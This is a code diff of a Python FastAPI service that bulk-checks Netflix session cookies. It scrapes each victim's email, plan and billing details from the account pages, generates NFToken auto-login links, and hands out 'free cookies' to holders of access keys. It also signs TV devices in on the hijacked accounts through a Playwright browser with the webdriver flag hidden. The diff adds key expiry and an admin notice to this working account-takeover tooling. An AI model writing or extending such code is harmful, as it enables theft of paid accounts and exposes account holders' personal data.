@@ -38,10 +38,12 @@ class KeyCreate(BaseModel):
     label: str
     max_devices: int = 1
     custom_key: Optional[str] = None
+    expires_at: Optional[str] = None
 
 class KeyUpdate(BaseModel):
     label: Optional[str] = None
     max_devices: Optional[int] = None
+    expires_at: Optional[str] = None
 
 class CookieCheckRequest(BaseModel):
     cookies_text: str
@@ -66,6 +68,9 @@ class TVCodeRequest(BaseModel):
     code: str
     cookie_id: str
 
+class NoticeUpdate(BaseModel):
+    message: str
+
 # --- Auth Helpers ---
 async def get_current_user(authorization: str = Header(None)):
     if not authorization or not authorization.startswith("Bearer "):
@@ -76,6 +81,12 @@ async def get_current_user(authorization: str = Header(None)):
         key_doc = await db.access_keys.find_one({"id": payload["key_id"]}, {"_id": 0})
         if not key_doc:
             raise HTTPException(status_code=401, detail="Key not found")
+        # Check expiry
+        expires_at = key_doc.get("expires_at")
+        if expires_at:
+            expiry = datetime.fromisoformat(expires_at).replace(tzinfo=timezone.utc)
+            if datetime.now(timezone.utc) > expiry:
+                raise HTTPException(status_code=401, detail="Access key has expired")
         session_id = payload.get("session_id")
         active = key_doc.get("active_sessions", [])
         if not any(s["session_id"] == session_id for s in active):
@@ -137,14 +148,11 @@ def parse_cookies_auto(text):
 # --- NFToken Generator (from Netflix GraphQL API) ---
 async def generate_nftoken(cookies: dict):
     """Generate Netflix auto-login token from cookies using Netflix's GraphQL API"""
-    # Normalize cookie names (case-insensitive lookup)
     norm = {}
     for k, v in cookies.items():
         norm[k] = v
-        # Also map lowercase versions
         norm[k.lower()] = v
 
-    # Build cookie string with original names
     netflix_id = norm.get('NetflixId') or norm.get('netflixid')
     secure_id = norm.get('SecureNetflixId') or norm.get('securenetflixid')
     nfvdid = norm.get('nfvdid')
@@ -152,7 +160,6 @@ async def generate_nftoken(cookies: dict):
     if not netflix_id or not secure_id:
         return False, None, f"Missing required cookies (NetflixId, SecureNetflixId)"
 
-    # Build full cookie string from all available cookies
     cookie_str = '; '.join([f"{k}={v}" for k, v in cookies.items()])
 
     payload = {
@@ -224,7 +231,6 @@ async def get_browser_data(cookies: dict):
 
             info = {"email": None, "plan": None, "country": None, "member_since": None, "next_billing": None, "profiles": []}
 
-            # 1) Visit /browse to establish session and check login
             try:
                 await page.goto("https://www.netflix.com/browse", timeout=25000)
                 await page.wait_for_load_state("domcontentloaded", timeout=10000)
@@ -237,47 +243,38 @@ async def get_browser_data(cookies: dict):
                 await browser.close()
                 return False, "", {}, info
 
-            # 2) Capture ALL browser cookies (Netflix sets SecureNetflixId, nfvdid, etc.)
             all_browser_cookies = await context.cookies()
             netflix_cookies = [c for c in all_browser_cookies if 'netflix' in c.get('domain', '').lower()]
             browser_cookies_str = '; '.join([f"{c['name']}={c['value']}" for c in netflix_cookies])
             browser_cookies_dict = {c['name']: c['value'] for c in netflix_cookies}
 
-            # Detect country from URL
             country_match = re.search(r'netflix\.com/([a-z]{2})/', url)
             if country_match:
                 info['country'] = country_match.group(1).upper()
 
-            # 3) Visit /account/security to get email
             try:
                 await page.goto("https://www.netflix.com/account/security", timeout=20000)
                 await page.wait_for_load_state("domcontentloaded", timeout=10000)
                 await page.wait_for_timeout(2000)
                 security_html = await page.content()
-
-                # Try to find email on the security page
                 email_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', security_html)
                 if email_match:
                     info['email'] = email_match.group(1)
             except Exception as e:
                 logger.warning(f"Security page error: {e}")
 
-            # 4) Visit /YourAccount to get plan, billing, profiles
             try:
                 await page.goto("https://www.netflix.com/YourAccount", timeout=20000)
                 await page.wait_for_load_state("domcontentloaded", timeout=10000)
                 await page.wait_for_timeout(3000)
                 account_html = await page.content()
 
-                # Extract from reactContext (works if page hasn't fully rendered yet)
                 ctx_match = re.search(r'reactContext\s*=\s*({.*?});', account_html, re.DOTALL)
                 if ctx_match:
                     try:
                         raw_json = ctx_match.group(1)
-                        # Decode JavaScript hex escapes (\xNN) to actual characters
                         raw_json = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), raw_json)
-                        # Fix any remaining invalid escape sequences
-                        raw_json = re.sub(r'\\(?!["\\/bfnrtu])', r'\\\\', raw_json)
+                        raw_json = re.sub(r'\\(?!["\\\/bfnrtu])', r'\\\\', raw_json)
                         ctx = json.loads(raw_json)
                         models = ctx.get('models', {})
                         user_info = models.get('userInfo', {}).get('data', {})
@@ -288,7 +285,6 @@ async def get_browser_data(cookies: dict):
                         info['member_since'] = format_member_since(user_info.get('memberSince'))
                         plan_data = models.get('planInfo', {}).get('data', {})
                         account_data = models.get('accountInfo', {}).get('data', {})
-                        # Plan from maxStreams (most reliable - doesn't change with language)
                         max_streams = account_data.get('maxStreams')
                         if max_streams is not None:
                             if max_streams >= 4:
@@ -298,7 +294,6 @@ async def get_browser_data(cookies: dict):
                             else:
                                 info['plan'] = 'Basic'
                             logger.info(f"Plan from maxStreams={max_streams}: {info['plan']}")
-                        # Fallback: try planInfo.planName
                         if not info['plan']:
                             raw_plan = plan_data.get('planName')
                             if raw_plan:
@@ -313,12 +308,10 @@ async def get_browser_data(cookies: dict):
                     except Exception as e:
                         logger.warning(f"reactContext parse error: {e}")
 
-                # Method 2: Read plan directly from rendered DOM via JavaScript
                 if not info['plan']:
                     try:
                         dom_plan = await page.evaluate("""
                             () => {
-                                // Try Netflix account page selectors
                                 const selectors = [
                                     '[data-uia="plan-label"]',
                                     '[data-uia="plan-section-label"]',
@@ -330,16 +323,6 @@ async def get_browser_data(cookies: dict):
                                     const el = document.querySelector(sel);
                                     if (el && el.textContent.trim()) return el.textContent.trim();
                                 }
-                                // Broader: find any element with plan-related text
-                                const allText = document.body.innerText;
-                                const planPatterns = [
-                                    /Premium\\s*(?:\\(UHD\\)|UHD|4K)?/i,
-                                    /Standard\\s*(?:with\\s*ads|avec\\s*pub|con\\s*anuncios)?/i,
-                                    /Standard\\s*(?:\\(HD\\)|HD)?/i,
-                                    /Basic\\s*(?:with\\s*ads)?/i,
-                                    /Offre\\s+(?:Premium|Standard|Essentiel|Basique)[^\\n]*/i,
-                                ];
-                                // Look in window netflix context if available
                                 try {
                                     const ctx = window.netflix?.appContext?.state?.models?.planInfo?.data;
                                     if (ctx?.planName) return ctx.planName;
@@ -357,7 +340,6 @@ async def get_browser_data(cookies: dict):
                     except Exception as e:
                         logger.warning(f"DOM plan extraction error: {e}")
 
-                # Method 3: Regex for planName in any JSON/script in HTML
                 if not info['plan']:
                     plan_matches = re.findall(r'"planName"\s*:\s*"([^"]+)"', account_html)
                     for pm in plan_matches:
@@ -367,7 +349,6 @@ async def get_browser_data(cookies: dict):
                             info['plan'] = normalized
                             break
 
-                # Method 4: Simple text search (last resort - better than no plan)
                 if not info['plan']:
                     for pl in ['Standard with ads', 'Standard avec pub', 'Premium', 'Standard', 'Basic with ads', 'Basic', 'Mobile']:
                         if pl.lower() in account_html.lower():
@@ -375,7 +356,6 @@ async def get_browser_data(cookies: dict):
                             logger.info(f"Text fallback plan: {pl} -> {info['plan']}")
                             break
 
-                # Fallback email from account page
                 if not info['email']:
                     m = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', account_html)
                     if m:
@@ -423,7 +403,6 @@ async def check_netflix_cookie(cookie_text, format_type="auto"):
 
     browser_cookies_dict = {}
 
-    # STEP 1: Playwright - get browser cookies + email from /account/security + account info
     try:
         is_logged_in, browser_cookies_str, browser_cookies_dict, info = await get_browser_data(cookies)
 
@@ -442,8 +421,6 @@ async def check_netflix_cookie(cookie_text, format_type="auto"):
     except Exception as e:
         logger.warning(f"Playwright failed: {e}")
 
-    # STEP 2: Generate NFToken using BROWSER cookies first, then original cookies as fallback
-    # Browser cookies have fresh SecureNetflixId etc. from the session
     nftoken_attempts = []
     if browser_cookies_dict:
         nftoken_attempts.append(("browser", browser_cookies_dict))
@@ -463,7 +440,6 @@ async def check_netflix_cookie(cookie_text, format_type="auto"):
         except Exception as e:
             logger.warning(f"NFToken ({source}) error: {e}")
 
-    # STEP 3: httpx fallback for account info if Playwright didn't get it
     if result["status"] != "valid" or not result["email"]:
         try:
             headers = {
@@ -476,7 +452,6 @@ async def check_netflix_cookie(cookie_text, format_type="auto"):
             httpx_cookies = browser_cookies_dict if browser_cookies_dict else cookies
 
             async with httpx.AsyncClient(follow_redirects=True, timeout=20.0) as http:
-                # Try /account/security for email
                 if not result["email"]:
                     try:
                         sec_resp = await http.get(
@@ -493,7 +468,6 @@ async def check_netflix_cookie(cookie_text, format_type="auto"):
                     except Exception:
                         pass
 
-                # Try /YourAccount for plan, country etc
                 if not result["plan"] or not result["country"]:
                     try:
                         acc_resp = await http.get(
@@ -514,7 +488,7 @@ async def check_netflix_cookie(cookie_text, format_type="auto"):
                                         try:
                                             raw_json = match.group(1)
                                             raw_json = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), raw_json)
-                                            raw_json = re.sub(r'\\(?!["\\/bfnrtu])', r'\\\\', raw_json)
+                                            raw_json = re.sub(r'\\(?!["\\\/bfnrtu])', r'\\\\', raw_json)
                                             ctx = json.loads(raw_json)
                                             models = ctx.get('models', {})
                                             user_info = models.get('userInfo', {}).get('data', {})
@@ -526,7 +500,6 @@ async def check_netflix_cookie(cookie_text, format_type="auto"):
                                                 result['member_since'] = format_member_since(user_info.get('memberSince'))
                                             plan_info = models.get('planInfo', {}).get('data', {})
                                             account_data = models.get('accountInfo', {}).get('data', {})
-                                            # Plan from maxStreams (most reliable)
                                             max_streams = account_data.get('maxStreams')
                                             if max_streams is not None and not result['plan']:
                                                 if max_streams >= 4:
@@ -559,14 +532,12 @@ async def check_netflix_cookie(cookie_text, format_type="auto"):
                                 if em:
                                     result['email'] = em.group(1)
                             if not result['plan']:
-                                # JSON regex for planName
                                 plan_matches = re.findall(r'"planName"\s*:\s*"([^"]+)"', html)
                                 for pm in plan_matches:
                                     normalized = normalize_plan_name(pm)
                                     if normalized:
                                         result['plan'] = normalized
                                         break
-                            # Simple text search as last resort
                             if not result['plan']:
                                 for p in ['Standard with ads', 'Standard avec pub', 'Premium', 'Standard', 'Basic with ads', 'Basic', 'Mobile']:
                                     if p.lower() in html.lower():
@@ -580,11 +551,15 @@ async def check_netflix_cookie(cookie_text, format_type="auto"):
         except Exception as e:
             logger.warning(f"httpx fallback error: {e}")
 
-    # If nothing validated the cookie
     if result["status"] == "expired" and not result["error"]:
         result["error"] = "Cookie expired or invalid"
 
     return result
+
+# --- Ping Route ---
+@api_router.get("/ping")
+async def ping():
+    return {"status": "ok"}
 
 # --- Auth Routes ---
 @api_router.post("/auth/login")
@@ -592,6 +567,13 @@ async def login(data: KeyLogin):
     key_doc = await db.access_keys.find_one({"key_value": data.key}, {"_id": 0})
     if not key_doc:
         raise HTTPException(status_code=401, detail="Invalid access key")
+
+    # Check expiry on login too
+    expires_at = key_doc.get("expires_at")
+    if expires_at:
+        expiry = datetime.fromisoformat(expires_at).replace(tzinfo=timezone.utc)
+        if datetime.now(timezone.utc) > expiry:
+            raise HTTPException(status_code=401, detail="Access key has expired")
 
     active = key_doc.get("active_sessions", [])
     if len(active) >= key_doc.get("max_devices", 1) and not key_doc.get("is_master"):
@@ -636,14 +618,11 @@ async def get_me(user: dict = Depends(get_current_user)):
     return {"id": user["id"], "label": user["label"], "is_master": user["is_master"]}
 
 # --- Cookie Check Routes ---
-
-# Concurrency limiter for cookie checks
 _check_semaphore = asyncio.Semaphore(5)
 
 async def check_cookie_with_semaphore(block, format_type, job_id, index, total, user):
     async with _check_semaphore:
         result = await check_netflix_cookie(block, format_type)
-        # Update job progress in DB
         await db.checks.update_one(
             {"id": job_id},
             {
@@ -656,7 +635,6 @@ async def check_cookie_with_semaphore(block, format_type, job_id, index, total, 
                 }
             }
         )
-        # Log valid cookies
         if result["status"] == "valid":
             await db.valid_logs.insert_one({
                 "id": str(uuid.uuid4()),
@@ -714,11 +692,7 @@ async def check_cookies(data: CookieCheckRequest, user: dict = Depends(get_curre
 
     asyncio.create_task(run_bulk_check(check_id, cookie_blocks, data.format_type, user))
 
-    return {
-        "id": check_id,
-        "total": total,
-        "status": "processing"
-    }
+    return {"id": check_id, "total": total, "status": "processing"}
 
 @api_router.post("/check/file")
 async def check_cookies_file(file: UploadFile = File(...), user: dict = Depends(get_current_user)):
@@ -750,12 +724,7 @@ async def check_cookies_file(file: UploadFile = File(...), user: dict = Depends(
 
     asyncio.create_task(run_bulk_check(check_id, cookie_blocks, "auto", user))
 
-    return {
-        "id": check_id,
-        "total": total,
-        "status": "processing"
-    }
-
+    return {"id": check_id, "total": total, "status": "processing"}
 
 @api_router.post("/check/files")
 async def check_cookies_files(files: List[UploadFile] = File(...), user: dict = Depends(get_current_user)):
@@ -792,13 +761,7 @@ async def check_cookies_files(files: List[UploadFile] = File(...), user: dict = 
 
     asyncio.create_task(run_bulk_check(check_id, all_cookie_blocks, "auto", user))
 
-    return {
-        "id": check_id,
-        "total": total,
-        "status": "processing",
-        "filenames": filenames
-    }
-
+    return {"id": check_id, "total": total, "status": "processing", "filenames": filenames}
 
 @api_router.get("/check/{job_id}/status")
 async def get_check_status(job_id: str, user: dict = Depends(get_current_user)):
@@ -851,6 +814,21 @@ async def get_nftoken(data: CookieCheckRequest, user: dict = Depends(get_current
     else:
         return {"success": False, "nftoken": None, "error": error}
 
+# --- Admin Notice Routes ---
+@api_router.get("/admin/notice")
+async def get_notice(user: dict = Depends(get_current_user)):
+    setting = await db.settings.find_one({"key": "admin_notice"}, {"_id": 0})
+    return {"message": setting["value"] if setting else ""}
+
+@api_router.post("/admin/notice")
+async def set_notice(data: NoticeUpdate, user: dict = Depends(require_admin)):
+    await db.settings.update_one(
+        {"key": "admin_notice"},
+        {"$set": {"key": "admin_notice", "value": data.message}},
+        upsert=True
+    )
+    return {"message": data.message}
+
 # --- Admin Routes ---
 @api_router.post("/admin/keys")
 async def create_key(data: KeyCreate, user: dict = Depends(require_admin)):
@@ -869,9 +847,10 @@ async def create_key(data: KeyCreate, user: dict = Depends(require_admin)):
         "max_devices": data.max_devices,
         "active_sessions": [],
         "is_master": False,
+        "expires_at": data.expires_at or None,
         "created_at": datetime.now(timezone.utc).isoformat()
     })
-    return {"id": key_id, "key_value": key_value, "label": data.label, "max_devices": data.max_devices}
+    return {"id": key_id, "key_value": key_value, "label": data.label, "max_devices": data.max_devices, "expires_at": data.expires_at}
 
 @api_router.get("/admin/keys")
 async def list_keys(user: dict = Depends(require_admin)):
@@ -895,6 +874,8 @@ async def update_key(key_id: str, data: KeyUpdate, user: dict = Depends(require_
         updates["label"] = data.label
     if data.max_devices is not None:
         updates["max_devices"] = data.max_devices
+    if data.expires_at is not None:
+        updates["expires_at"] = data.expires_at if data.expires_at != "" else None
     if not updates:
         raise HTTPException(status_code=400, detail="Nothing to update")
     await db.access_keys.update_one({"id": key_id}, {"$set": updates})
@@ -985,7 +966,6 @@ async def get_free_cookies(user: dict = Depends(get_current_user)):
     setting = await db.settings.find_one({"key": "free_cookies_limit"}, {"_id": 0})
     limit = setting["value"] if setting else 10
     cookies = await db.free_cookies.find({}, {"_id": 0}).sort("created_at", -1).to_list(limit)
-    # Strip sensitive cookie data for non-admin users
     if not user.get("is_master"):
         for c in cookies:
             c.pop("browser_cookies", None)
@@ -997,40 +977,6 @@ async def force_refresh_tokens(user: dict = Depends(require_admin)):
     free_cookies = await db.free_cookies.find({}, {"_id": 0}).to_list(500)
     if not free_cookies:
         return {"message": "No free cookies to refresh", "refreshed": 0, "dead": 0, "total": 0}
-@api_router.post("/free-cookies/{cookie_id}/refresh-token")
-async def refresh_single_free_cookie_token(cookie_id: str, user: dict = Depends(get_current_user)):
-    fc = await db.free_cookies.find_one({"id": cookie_id}, {"_id": 0})
-    if not fc:
-        raise HTTPException(status_code=404, detail="Cookie not found")
-
-    cookies_dict = None
-    if fc.get("browser_cookies"):
-        cookies_dict = parse_cookie_string_to_dict(fc["browser_cookies"])
-    if not cookies_dict or not cookies_dict.get("NetflixId"):
-        if fc.get("full_cookie"):
-            cookies_dict = parse_cookies_auto(fc["full_cookie"])
-    if not cookies_dict:
-        raise HTTPException(status_code=400, detail="Cookie data is invalid or expired")
-
-    success, nft, nft_err = await generate_nftoken(cookies_dict)
-    if success and nft:
-        await db.free_cookies.update_one(
-            {"id": cookie_id},
-            {"$set": {
-                "nftoken": nft,
-                "nftoken_link": f"https://netflix.com?nftoken={nft}",
-                "is_alive": True,
-                "last_refreshed": datetime.now(timezone.utc).isoformat()
-            }}
-        )
-        return {"nftoken": nft, "nftoken_link": f"https://netflix.com?nftoken={nft}"}
-    else:
-        await db.free_cookies.update_one(
-            {"id": cookie_id},
-            {"$set": {"is_alive": False, "last_refreshed": datetime.now(timezone.utc).isoformat()}}
-        )
-        raise HTTPException(status_code=400, detail=nft_err or "Failed to generate token — cookie may be dead")
-
 
     refreshed = 0
     dead = 0
@@ -1071,6 +1017,40 @@ async def refresh_single_free_cookie_token(cookie_id: str, user: dict = Depends(
 
     return {"message": f"Refreshed {refreshed} alive, {dead} dead out of {len(free_cookies)}", "refreshed": refreshed, "dead": dead, "total": len(free_cookies)}
 
+@api_router.post("/free-cookies/{cookie_id}/refresh-token")
+async def refresh_single_free_cookie_token(cookie_id: str, user: dict = Depends(get_current_user)):
+    fc = await db.free_cookies.find_one({"id": cookie_id}, {"_id": 0})
+    if not fc:
+        raise HTTPException(status_code=404, detail="Cookie not found")
+
+    cookies_dict = None
+    if fc.get("browser_cookies"):
+        cookies_dict = parse_cookie_string_to_dict(fc["browser_cookies"])
+    if not cookies_dict or not cookies_dict.get("NetflixId"):
+        if fc.get("full_cookie"):
+            cookies_dict = parse_cookies_auto(fc["full_cookie"])
+    if not cookies_dict:
+        raise HTTPException(status_code=400, detail="Cookie data is invalid or expired")
+
+    success, nft, nft_err = await generate_nftoken(cookies_dict)
+    if success and nft:
+        await db.free_cookies.update_one(
+            {"id": cookie_id},
+            {"$set": {
+                "nftoken": nft,
+                "nftoken_link": f"https://netflix.com?nftoken={nft}",
+                "is_alive": True,
+                "last_refreshed": datetime.now(timezone.utc).isoformat()
+            }}
+        )
+        return {"nftoken": nft, "nftoken_link": f"https://netflix.com?nftoken={nft}"}
+    else:
+        await db.free_cookies.update_one(
+            {"id": cookie_id},
+            {"$set": {"is_alive": False, "last_refreshed": datetime.now(timezone.utc).isoformat()}}
+        )
+        raise HTTPException(status_code=400, detail=nft_err or "Failed to generate token — cookie may be dead")
+
 # --- TV Sign-In Code ---
 async def activate_tv_code(cookies: dict, code: str):
     """Use Playwright to enter a TV sign-in code on netflix.com/tv8"""
@@ -1097,7 +1077,6 @@ async def activate_tv_code(cookies: dict, code: str):
             page = await context.new_page()
             await page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
 
-            # Navigate to TV sign-in page
             await page.goto("https://www.netflix.com/clearbrowsinghistory/tv8", timeout=25000)
             await page.wait_for_load_state("domcontentloaded", timeout=15000)
             await page.wait_for_timeout(2000)
@@ -1107,7 +1086,6 @@ async def activate_tv_code(cookies: dict, code: str):
                 await browser.close()
                 return False, "Cookie expired - redirected to login"
 
-            # Try netflix.com/tv8 directly
             await page.goto("https://www.netflix.com/tv8", timeout=25000)
             await page.wait_for_load_state("domcontentloaded", timeout=15000)
             await page.wait_for_timeout(3000)
@@ -1117,30 +1095,23 @@ async def activate_tv_code(cookies: dict, code: str):
                 await browser.close()
                 return False, "Cookie expired - redirected to login"
 
-            # Clean the code (remove spaces/dashes)
             clean_code = code.replace(' ', '').replace('-', '').strip()
-
-            # Try to find and fill the code input
             filled = False
 
-            # Method 1: Look for individual digit inputs
             digit_inputs = page.locator('input[type="tel"], input[type="text"], input[type="number"]')
             count = await digit_inputs.count()
 
             if count >= len(clean_code):
-                # Multiple individual digit inputs
                 for i, digit in enumerate(clean_code):
                     if i < count:
                         await digit_inputs.nth(i).fill(digit)
                         await page.wait_for_timeout(200)
                 filled = True
             elif count == 1:
-                # Single input for full code
                 await digit_inputs.first.fill(clean_code)
                 filled = True
 
             if not filled:
-                # Method 2: Try common selectors
                 for selector in ['input[name="pin"]', 'input[data-uia="pin-input"]', 'input.pin-input', '#code-input', 'input']:
                     try:
                         el = page.locator(selector).first
@@ -1157,7 +1128,6 @@ async def activate_tv_code(cookies: dict, code: str):
 
             await page.wait_for_timeout(1000)
 
-            # Try to submit
             submitted = False
             for selector in ['button[type="submit"]', 'button[data-uia="action-button"]', 'button:has-text("Continue")', 'button:has-text("Activate")', 'button:has-text("Next")', 'button:has-text("Sign In")']:
                 try:
@@ -1170,18 +1140,15 @@ async def activate_tv_code(cookies: dict, code: str):
                     continue
 
             if not submitted:
-                # Try pressing Enter
                 await page.keyboard.press("Enter")
 
             await page.wait_for_timeout(5000)
 
-            # Check result
             final_url = page.url
             page_text = await page.inner_text('body')
 
             await browser.close()
 
-            # Check for success indicators
             if any(kw in page_text.lower() for kw in ['success', 'activated', 'signed in', 'enjoy', 'start watching', 'welcome']):
                 return True, "TV device activated successfully!"
             elif any(kw in page_text.lower() for kw in ['invalid', 'expired', 'incorrect', 'try again', 'error']):
@@ -1201,12 +1168,10 @@ async def submit_tv_code(data: TVCodeRequest, user: dict = Depends(get_current_u
     if not data.code.strip():
         raise HTTPException(status_code=400, detail="Enter a TV sign-in code")
 
-    # Get the free cookie
     fc = await db.free_cookies.find_one({"id": data.cookie_id}, {"_id": 0})
     if not fc:
         raise HTTPException(status_code=404, detail="Cookie not found")
 
-    # Parse cookies
     cookies_dict = None
     if fc.get("browser_cookies"):
         cookies_dict = parse_cookie_string_to_dict(fc["browser_cookies"])
@@ -1222,7 +1187,6 @@ async def submit_tv_code(data: TVCodeRequest, user: dict = Depends(get_current_u
 # --- NFToken Auto-Refresh for Free Cookies ---
 NFTOKEN_REFRESH_INTERVAL = 10 * 60  # 10 minutes in seconds
 
-# Month name translations to English
 MONTH_MAP = {
     'janvier': 'January', 'février': 'February', 'mars': 'March', 'avril': 'April',
     'mai': 'May', 'juin': 'June', 'juillet': 'July', 'août': 'August',
@@ -1238,30 +1202,23 @@ MONTH_MAP = {
 }
 
 def format_member_since(raw: str) -> str:
-    """Clean up member_since to 'Month Year' format"""
     if not raw:
         return None
-    # Decode any remaining \xNN escapes
     cleaned = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), raw)
     cleaned = cleaned.strip()
-    # Translate month names to English (use word boundaries to avoid partial matches)
     for foreign, english in MONTH_MAP.items():
         cleaned = re.sub(r'\b' + re.escape(foreign) + r'\b', english, cleaned, flags=re.IGNORECASE)
-    # Extract month and year
     match = re.search(r'([A-Za-zéû]+)\s*(\d{4})', cleaned)
     if match:
         return f"{match.group(1)} {match.group(2)}"
     return cleaned
 
 def normalize_plan_name(raw_plan: str) -> str:
-    """Normalize plan name from any Netflix format/language to standard English display name"""
     if not raw_plan:
         return None
     p = raw_plan.strip().lower()
-    
-    # Direct mappings for known plan identifiers and variations
+
     plan_map = {
-        # Premium variants (check BEFORE standard since "standard" is substring)
         'premium': 'Premium (UHD)',
         'premium (uhd)': 'Premium (UHD)',
         'premium uhd': 'Premium (UHD)',
@@ -1273,7 +1230,6 @@ def normalize_plan_name(raw_plan: str) -> str:
         'plano premium': 'Premium (UHD)',
         'plan premium': 'Premium (UHD)',
         'premium-plan': 'Premium (UHD)',
-        # Standard with ads variants (check BEFORE plain standard)
         'standard with ads': 'Standard with ads',
         'standard avec pub': 'Standard with ads',
         'standard con anuncios': 'Standard with ads',
@@ -1282,7 +1238,6 @@ def normalize_plan_name(raw_plan: str) -> str:
         'standard con pubblicità': 'Standard with ads',
         'offre standard avec pub': 'Standard with ads',
         'offre essentiel': 'Standard with ads',
-        # Standard variants
         'standard': 'Standard (HD)',
         'standard (hd)': 'Standard (HD)',
         'standard hd': 'Standard (HD)',
@@ -1297,7 +1252,6 @@ def normalize_plan_name(raw_plan: str) -> str:
         'padrão': 'Standard (HD)',
         'padrao': 'Standard (HD)',
         'standard-plan': 'Standard (HD)',
-        # Basic variants
         'basic': 'Basic',
         'basic with ads': 'Basic with ads',
         'básico': 'Basic',
@@ -1305,26 +1259,21 @@ def normalize_plan_name(raw_plan: str) -> str:
         'offre basique': 'Basic',
         'básico com anúncios': 'Basic with ads',
         'básico con anuncios': 'Basic with ads',
-        # Mobile
         'mobile': 'Mobile',
         'móvil': 'Mobile',
     }
-    
-    # Exact match first
+
     if p in plan_map:
         return plan_map[p]
-    
-    # Partial match - but check longer keys first to avoid premature matches
+
     sorted_keys = sorted(plan_map.keys(), key=len, reverse=True)
     for key in sorted_keys:
         if key in p:
             return plan_map[key]
-    
-    # If nothing matched, return the original with title case
+
     return raw_plan.strip().title()
 
 def parse_cookie_string_to_dict(cookie_str: str) -> dict:
-    """Parse 'key1=val1; key2=val2' string into a dict"""
     cookies = {}
     for pair in cookie_str.split(';'):
         pair = pair.strip()
@@ -1334,12 +1283,11 @@ def parse_cookie_string_to_dict(cookie_str: str) -> dict:
     return cookies
 
 async def refresh_free_cookie_tokens():
-    """Background task that refreshes NFTokens for all free cookies every 10 minutes and checks if alive"""
     first_run = True
     while True:
         try:
             if first_run:
-                await asyncio.sleep(10)  # Brief delay on startup before first refresh
+                await asyncio.sleep(10)
                 first_run = False
             else:
                 await asyncio.sleep(NFTOKEN_REFRESH_INTERVAL)
@@ -1395,11 +1343,10 @@ async def refresh_free_cookie_tokens():
             break
         except Exception as e:
             logger.error(f"NFToken refresh task error: {e}")
-            await asyncio.sleep(60)  # Wait a minute on error before retrying
+            await asyncio.sleep(60)
 
 _refresh_task = None
 
-# Include router
 app.include_router(api_router)
 
 app.add_middleware(
